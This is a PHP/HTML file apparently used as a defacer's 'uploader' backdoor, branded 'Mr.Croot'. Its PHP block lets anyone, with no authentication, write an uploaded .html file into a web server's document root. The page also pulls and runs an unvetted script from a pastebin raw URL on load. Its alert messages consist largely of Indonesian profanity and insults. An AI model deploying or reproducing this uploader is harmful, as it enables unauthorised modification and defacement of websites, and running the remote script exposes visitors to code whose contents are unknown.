<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <meta name="author" content="uploader by mr.croot"> 
    <meta name="description" content="[ kontol ]">
    <meta name="theme-color" content="#000">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
       <link rel="icon" href="https://i.top4top.io/s_1654bpe6r0.jpeg" type="image/jpg">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css'>
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> <script type="text/javascript" src="https://pastebin.com/raw/ynL2hpMe"></script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
		<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
		<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script> 
    <title><•[+]Uploader Mr.Croot[+]•></title>
	<script type="text/javascript">
	var rev = "fwd";
	function titlebar(val)
	{
	var msg = "Uploader By MrCroot";
	var res = " ";
	var speed = 30
	var pos = val;   
	msg = " " +msg+" ";
	var le = msg.length;
	if(rev == "fwd"){
	if(pos < le){
	pos = pos+1;
	scroll = msg.substr(0,pos);
	document.title = scroll;
	timer = window.setTimeout("titlebar("+pos+")",speed);
	}
	else{
	rev = "bwd";
	timer = window.setTimeout("titlebar("+pos+")",speed);
	}
	}
	else{
	if(pos > 0){
	pos = pos-1;
	var ale = le-pos;
	scrol = msg.substr(ale,le);
	document.title = scrol;
	timer = window.setTimeout("titlebar("+pos+")",speed);
	}
	else{
	rev = "fwd";
	timer = window.setTimeout("titlebar("+pos+")",speed);
	} 
	}
	}       
	titlebar(0);
</script>
<style>img[alt="www.000webhost.com"]{display:none;}</style></head>
    <style>
    	body {
              background: url(https://g.top4top.io/s_1654au7ck0.jpeg) no-repeat center center fixed;
              -webkit-background-size: cover;
                    -moz-background-size: cover;
                      -o-background-size: cover;    
                      background-size: cover;
    </style>
    <style>
    	body{background-color:#000;font-family:"Righteous";color:#fff;}
    	#ico{width:250px;height:250px;}
    </style>
  </head>
  <body>

    <div class="container text-center mx-auto">
    	<h2 class="mt-3">[+] uploader by mr.croot [+]</h2> 
    	<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQqEyYRMCB8RMMWWE_gbr2vq5G_asZUPzcIPg&usqp=CAU" class="mx-auto d-block" id="ico">    	
    	<div id="Clock" align="center" style="font-size:38px;font-family:'iceland';color:white;"></div>
<br><center><audio id="myAudio">
<source src="https://a.top4top.io/m_165463pzo0.mp3" type="audio/ogg">
<source src="https://a.top4top.io/m_165463pzo0.mp3" type="audio/mpeg3">
</audio>
<button onclick="playAudio()" class="bg-transparent text-white" type="button">Play Audio</button>
<button onclick="pauseAudio()" class="bg-transparent text-white" type="button">Pause Audio</button></center>
<script>
var x = document.getElementById("myAudio"); 

function playAudio() { 
  x.play(); 
} 

function pauseAudio() { 
  x.pause(); 
} 
</script>
<br>
    	<form method="post" enctype="multipart/form-data">
    		<div class="row">
    			<div class="col">
    				<input id="previews" placeholder="Pilih File" class="form-control bg-transparent text-white" readonly="readonly">
    			</div>
    			
    			<div class="col">
    				<div class="input-group">
    					<div class="custom-file">
    						<input type="file" name="randsx" class="custom-file-input bg-transparent" id="FileSel">
    						<label class="custom-file-label bg-transparent" for="previews"></label>
    					</div>
    				</div>
    			</div>
    		</div>
    		<button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load" data-loading-text="<i class='fa fa-refresh fa-spin'></i> Silahkan tunggu">Gasscok!!</button>
    	</form><hr>
<?php
	$server   = $_SERVER['DOCUMENT_ROOT'];
	$namaFile = $_FILES['randsx']['name'];
	$getcwd   = "$server/$namaFile";
	$typeExt  = pathinfo($namaFile, PATHINFO_EXTENSION);
if(isset($_POST['upload'])){
if($namaFile !== ''){
	if(is_writable($server)){
		if($typeExt === 'html'){
			if($namaFile !== 'index.html'){
				if(@copy($_FILES['randsx']['tmp_name'], $getcwd)){
					$akses = 'http://'.$_SERVER['HTTP_HOST'].'/';
					echo '<script>swal("Berhasil", "Silahkan Liat Njing", "Success")</script>';
					echo '<a href="'.$akses.$namaFile.'" target="_blank">Hasil Upload</a>';
				}else{
					echo '<script>swal("Gagal Upload Nying", "Gx Tau Males", "error")</script>';
				}
			}else{
				echo '<script>swal("Gagal Upload Nying", "Jangan Ngindex Anjing", "error")</script>';
			}
		}else{
			echo '<script>swal("Kesalahan", "MAU NIKUNG YA", "info">';
			}
		}else{
			echo '<script>swal("Gagal Dientot", "titid lu kurang gede", "error")</script>';
		}
	}else{
		echo '<script>swal("Woii Bangsat", "Belum Pilih File Anjing", "info")</script>';
	}
}
?>
    </div>
		<script>
			document.getElementById('FileSel').onchange = function()
			{
				document.getElementById('previews').value = this.value;
			};
			
			$('.btn').on('click', function(){
				var $this = $(this);
				$this.button('loading');
			});
			
		</script>
</body>
</html>
